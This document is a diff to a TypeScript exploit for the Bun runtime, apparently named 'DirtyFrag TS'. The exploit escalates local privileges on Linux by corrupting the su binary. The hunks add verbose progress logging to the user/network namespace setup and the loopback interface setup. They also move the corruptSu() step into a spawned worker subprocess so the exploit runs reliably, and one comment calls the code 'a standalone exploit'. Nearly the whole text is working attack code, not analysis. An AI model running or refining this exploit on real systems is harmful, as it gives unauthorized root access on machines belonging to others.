@@ -592,42 +592,49 @@ function setupUsernsNetns(): void {
   const realGid = C.getgid() as number;
   progress(`setupUsernsNetns: uid=${realUid} gid=${realGid}`);
 
+  progress("setupUsernsNetns: unshare(CLONE_NEWUSER|CLONE_NEWNET)...");
   if ((C.unshare(CLONE_NEWUSER | CLONE_NEWNET) as number) < 0) {
-    SLOG(`unshare: ${errStr()}`);
+    progress(`setupUsernsNetns: unshare FAILED: ${errStr()}`);
     process.exit(1);
   }
+  progress("setupUsernsNetns: unshare OK");
 
+  progress("setupUsernsNetns: writing setgroups/uid_map/gid_map...");
   writeProc("/proc/self/setgroups", "deny");
+  progress("setupUsernsNetns: setgroups=deny done");
 
   if (writeProc("/proc/self/uid_map", `0 ${realUid} 1`) < 0) {
-    SLOG(`uid_map: ${errStr()}`);
-    process.exit(1);
+    progress(`setupUsernsNetns: uid_map FAILED: ${errStr()}`); process.exit(1);
   }
-  if (writeProc("/proc/self/gid_map", `0 ${realGid} 1`) < 0) {
-    SLOG(`gid_map: ${errStr()}`);
-    process.exit(1);
-  }
+  progress("setupUsernsNetns: uid_map done");
 
+  if (writeProc("/proc/self/gid_map", `0 ${realGid} 1`) < 0) {
+    progress(`setupUsernsNetns: gid_map FAILED: ${errStr()}`); process.exit(1);
+  }
+  progress("setupUsernsNetns: gid_map done");
+
+  progress("setupUsernsNetns: bringing up lo interface...");
   const s = C.socket(AF_INET, SOCK_DGRAM, 0) as number;
   if (s < 0) {
-    SLOG(`socket: ${errStr()}`);
-    process.exit(1);
+    progress(`setupUsernsNetns: socket FAILED: ${errStr()}`); process.exit(1);
   }
 
   const ifr = Buffer.alloc(SIZEOF_IFREQ, 0);
-  writeStr(ifr, 0, "lo"); // ifr_name = "lo"
+  writeStr(ifr, 0, "lo");
 
   if ((C.ioctl(s, SIOCGIFFLAGS, ptr(ifr)) as number) < 0) {
-    SLOG(`SIOCGIFFLAGS: ${errStr()}`);
-    process.exit(1);
+    progress(`setupUsernsNetns: SIOCGIFFLAGS FAILED: ${errStr()}`); process.exit(1);
   }
-  const flags = ifr.readInt16LE(IFNAMSIZ); // ifr_flags at offset 16
+  progress("setupUsernsNetns: SIOCGIFFLAGS OK");
+
+  const flags = ifr.readInt16LE(IFNAMSIZ);
   ifr.writeInt16LE(flags | IFF_UP | IFF_RUNNING, IFNAMSIZ);
+
   if ((C.ioctl(s, SIOCSIFFLAGS, ptr(ifr)) as number) < 0) {
-    SLOG(`SIOCSIFFLAGS: ${errStr()}`);
-    process.exit(1);
+    progress(`setupUsernsNetns: SIOCSIFFLAGS FAILED: ${errStr()}`); process.exit(1);
   }
   C.close(s);
+  progress("setupUsernsNetns: lo UP — namespace ready");
 }
 
 // ── add_xfrm_sa ───────────────────────────────────────────────────────────────
@@ -922,16 +929,19 @@ export function suLpeMain(argv: string[]): number {
   }
   if (getEnv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;
 
-  // Bun uses a multithreaded JS engine (JSC). fork() via FFI leaves the child
-  // with dead GC/JIT threads and a broken heap — the first Bun runtime call
-  // (e.g. process.stdout.write) triggers a JSC assertion → SIGILL (status 0x84).
-  // Fix: run corruptSu() inline in the main process instead of forking.
-  // The unshare(CLONE_NEWUSER|CLONE_NEWNET) will affect the current process,
-  // which is acceptable for a standalone exploit.
-  progress("suLpeMain: running corruptSu() inline (no fork — Bun JSC fork limitation)");
-  const rc = corruptSu();
+  // Use Bun.spawnSync to run the corruption in a fresh Bun process — mirrors
+  // the C code's fork()+child pattern but avoids the multithreaded JSC issue.
+  // The child process calls unshare(CLONE_NEWUSER|CLONE_NEWNET) which changes
+  // only its own namespaces; the parent event loop is completely unaffected.
+  progress("suLpeMain: spawning corruption worker subprocess...");
+  const worker = Bun.spawnSync(
+    [process.execPath, "--bun", import.meta.path, "--corruption-worker"],
+    { stdout: "inherit", stderr: "inherit", stdin: "ignore" },
+  );
+  const rc = worker.exitCode ?? -1;
+  progress(`suLpeMain: worker exited with code=${rc} (signal=${worker.signalCode})`);
   if (rc !== 0) {
-    progress(`suLpeMain: corruptSu FAILED rc=${rc}`);
+    progress("suLpeMain: corruption worker FAILED");
     return 1;
   }
 
@@ -2698,10 +2708,23 @@ export function main(argv: string[]): number {
 
 // Bun top-level: only run when executed directly (not imported)
 if (import.meta.main) {
+  const args = process.argv.slice(2);
+
+  // ── corruption worker subprocess ──────────────────────────────────────────
+  // Launched by suLpeMain via Bun.spawnSync — mirrors the C fork() child.
+  // Runs in a fresh Bun process so unshare(CLONE_NEWUSER|CLONE_NEWNET) only
+  // affects THIS process, not the parent event loop.
+  if (args.includes("--corruption-worker")) {
+    progress("corruption-worker: starting corruptSu()");
+    const rc = corruptSu();
+    progress(`corruption-worker: corruptSu returned ${rc}`);
+    process.exit(rc === 0 ? 0 : 2);
+  }
+
   progress(
-    `DirtyFrag TS starting — Bun ${Bun.version} args=[${process.argv.slice(2).join(",")}]`,
+    `DirtyFrag TS starting — Bun ${Bun.version} args=[${args.join(",")}]`,
   );
-  process.exit(main(process.argv.slice(2)));
+  process.exit(main(args));
 }
 
 export function findKOfflineGeneric(
